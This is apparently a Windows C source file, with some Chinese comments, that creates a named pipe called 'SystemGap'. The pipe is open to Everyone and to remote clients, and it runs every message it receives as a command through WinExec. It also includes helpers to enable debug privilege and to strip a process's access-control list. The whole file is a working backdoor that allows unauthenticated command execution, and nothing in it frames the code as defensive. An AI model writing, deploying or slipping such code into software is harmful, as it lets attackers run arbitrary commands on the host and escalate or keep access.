#include <Windows.h>
#include <stdio.h>
#include <aclapi.h>

#define BUFF_SIZE 1024

void EnableDebugPriv(void) //提升权限
{
	HANDLE hToken;
	LUID sedebugnamevalue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(),//返回当前进程的伪句柄
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,//要求改变访问信令中指定的权限
		//要求查寻访问信令的内容
		&hToken))//当函数返回时,该参数标识新打开的访问信令
		return;
	if (!LookupPrivilegeValue(NULL,//函数试图查找局部系统上的权限名称
		SE_DEBUG_NAME,//要求调试一个进程的权限
		&sedebugnamevalue))
	{
		CloseHandle(hToken);
		return;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnamevalue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;//允许权限
	if (!AdjustTokenPrivileges(hToken,//标识访问信令
		FALSE,//为FALSE,则根剧tkp指像的信息修改权限
		&tkp,
		sizeof tkp,
		NULL,
		NULL))
		CloseHandle(hToken);
}

DWORD RemoveProcessSecurityDescriptor(
	HANDLE hProcess          // handle of object
)
{
	DWORD dwRes = 0;
	ACL emptyACL;
	if (NULL == hProcess)
		return ERROR_INVALID_PARAMETER;

	if (!InitializeAcl(&emptyACL, sizeof(emptyACL), ACL_REVISION))
	{
		printf("InitializeAcl Error %u\n", dwRes);
		return dwRes;
	}
	dwRes = SetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &emptyACL, NULL);
	if (ERROR_SUCCESS != dwRes) {
		printf("SetNamedSecurityInfo Error %u\n", dwRes);
		return dwRes;
	}
	printf("Sucess...\n");
	return dwRes;
}

BOOL GenerateEveryoneSecAttr(PSECURITY_ATTRIBUTES sa) {
	PSID pEveryoneSID = NULL;
	PACL pACL = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;
	EXPLICIT_ACCESS ea[1];
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld =SECURITY_WORLD_SID_AUTHORITY;
	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
	DWORD dwRes = 0;
	// Create a well-known SID for the Everyone group.
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1,
		SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0,
		&pEveryoneSID))
	{
		printf("[-]AllocateAndInitializeSid Error %u\n", GetLastError());
		return FALSE;
	}

	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea[0].grfAccessPermissions = GENERIC_ALL;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPTSTR)pEveryoneSID;
	dwRes = SetEntriesInAcl(1, ea, NULL, &pACL);
	if (ERROR_SUCCESS != dwRes)
	{
		printf("[-]SetEntriesInAcl Error %u\n", GetLastError());
		return FALSE;
	}
	pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (!InitializeSecurityDescriptor(pSD,SECURITY_DESCRIPTOR_REVISION))
	{
		printf("[-]InitializeSecurityDescriptor Error %u\n", GetLastError());
		return FALSE;
	}
	if (!SetSecurityDescriptorDacl(pSD,
		TRUE,     // bDaclPresent flag   
		pACL,
		FALSE))   // not a default DACL 
	{
		printf("[-]SetSecurityDescriptorDacl Error %u\n", GetLastError());
		return FALSE;
	}

	// Initialize a security attributes structure.
	sa->nLength = sizeof(SECURITY_ATTRIBUTES);
	sa->lpSecurityDescriptor = pSD;
	sa->bInheritHandle = FALSE;
	return TRUE;
}

HANDLE CreateSystemGap(
	char * gap_name
)
{
	DWORD dwRes = 0;
	if (NULL == gap_name) {
		return NULL;
	}
	SECURITY_ATTRIBUTES sa;
	if (GenerateEveryoneSecAttr(&sa) == FALSE)
	{
		printf("[-]Generate PSECURITY_ATTRIBUTES Error %u\n", GetLastError());
		return NULL;
	}
	HANDLE hPipe = CreateNamedPipeA(
		gap_name,
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE |  PIPE_WAIT| PIPE_ACCEPT_REMOTE_CLIENTS,
		PIPE_UNLIMITED_INSTANCES,
		BUFF_SIZE,
		BUFF_SIZE,
		0,
		&sa);

	if (hPipe == INVALID_HANDLE_VALUE) {
		dwRes = GetLastError();
		printf("[-]Create Pipe Error %d \n", dwRes);
		return NULL;
	}

	// dwRes = SetNamedSecurityInfoA(gap_name, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);
	
	if (ERROR_SUCCESS != dwRes) {
		printf("[-]SetNamedSecurityInfo Error %u\n", dwRes);
		return NULL;
	}

	printf("[+]Create Gap Sucess...\n");
	return hPipe;
}

void HandleGapMsg(HANDLE hGap) {
	while (TRUE) {
		Sleep(1000);
		printf("[+]Waiting for Client....\n");
		if (ConnectNamedPipe(hGap, NULL) ?TRUE : (GetLastError() == ERROR_PIPE_CONNECTED)) {
			//// 客户端连接成功....
			char szBuffer[BUFF_SIZE];
			memset(szBuffer, 0, BUFF_SIZE);
			DWORD dwLen;
			ReadFile(hGap, szBuffer, BUFF_SIZE, &dwLen, NULL);
			printf("[+]Receive %d bytes.\n", dwLen);
			WinExec(szBuffer, TRUE);
			DisconnectNamedPipe(hGap);
		}
		
	}
	return;
}

int main(int argc, char* argv[]) {
	// EnableDebugPriv();
	HANDLE hGap = CreateSystemGap("\\\\.\\pipe\\SystemGap");
	if (hGap != INVALID_HANDLE_VALUE)
	{
		HandleGapMsg(hGap);
	}
	return 0;
}